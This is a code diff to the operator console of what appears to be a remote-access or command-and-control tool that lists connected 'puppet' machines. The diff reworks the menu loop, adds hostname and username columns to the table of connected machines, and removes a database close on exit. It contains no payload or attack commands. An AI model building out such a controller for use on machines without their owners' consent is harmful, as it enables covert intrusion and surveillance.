@@ -110,8 +110,8 @@ class Puppeteer:
 
     def _control_panel(self):
         """ Shows a menu and starts communication based on the chosen option"""
+        _main_menu()
         while True:
-            _main_menu()
             command_number = input(to_yellow("[ COMMAND OPTION ] >> "))
             if command_number == '0':
                 self._list_connections()
@@ -207,10 +207,15 @@ class Puppeteer:
     def _list_connections(self):
         """ Lists the connected puppets """
         if self.__connected_puppets:
-            print(f"{'ID':^6}{'IP ADDRESS':^15}{'OS':^8}{'ARCHITECTURE':^15}")
+            print(to_green(
+                f"{'ACTIVE CONNECTIONS'.center(67,'=')}\n\n"
+                f"{'ID':^6}{'IP ADDRESS':^15}"
+                f"{'OS':^10}{'ARCH':^8}"
+                f"{'HOST':^12}{'USER':^12}\n"))
             for _, puppet in enumerate(self.__connected_puppets):
-                print(f"{_:^6}{puppet.ip_address:^15}{puppet.op_system:^8}"
-                      f"{puppet.architecture:^15}")
+                print(f"{_:^6}{puppet.ip_address:^15}{puppet.op_system:^10}"
+                      f"{puppet.architecture:^12}{puppet.hostname:^12}"
+                      f"{puppet.username:^12}")
             print()
         else:
             print(to_red("\n[ - ] There is no puppet connected\n"))
@@ -348,7 +353,6 @@ class Puppeteer:
         """
         self.__database.disconnect_puppets_on_exit()
         self.__connected_puppets.clear()
-        self.__database.conn.close()
         sys.exit(0)
 
 
